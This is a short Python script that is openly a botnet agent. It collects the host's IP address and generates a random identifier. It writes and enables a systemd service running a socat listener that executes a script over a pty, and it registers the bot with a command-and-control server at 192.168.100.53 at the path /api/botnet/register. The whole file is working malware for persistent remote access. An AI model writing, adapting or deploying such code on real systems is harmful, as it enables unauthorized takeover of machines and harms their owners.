import requests
import socket
import random
import netifaces
from string import ascii_letters, digits
import subprocess


interface = netifaces.interfaces()
port_used = random.randrange(40000, 60000)
identifier = ""
for i in range(10):
     x = random.randrange(len(ascii_letters + f"{digits}"))
     full = ascii_letters + digits
     identifier+=str(full[x])

bot_data = {
        'ip':netifaces.ifaddresses(interface[1])[2][0]['addr'],
        'port': port_used, 
        'identifier':identifier
}
file = open(f"./{identifier}.service", "w")
file.write(f'''
[Unit]
Description=Listening to someone :)

[Service]
Type=simple
StandardOutput=syslog
StandardError=syslog

ExecStart=socat TCP-LISTEN:{port_used},reuseaddr,fork EXEC:/root/status.py,stderr,pty,echo=0

[Install]
WantedBy=multi-user.target
''')
file.close()
try:
    request = requests.post("http://192.168.100.53:5000/api/botnet/register", data=bot_data)
    print(request)
    subprocess.run(["systemctl", "link", f"./{identifier}.service"])
    subprocess.run(["systemctl", "enable", f"{identifier}.service" , "--now"])
except Exception as e:
    print(e)
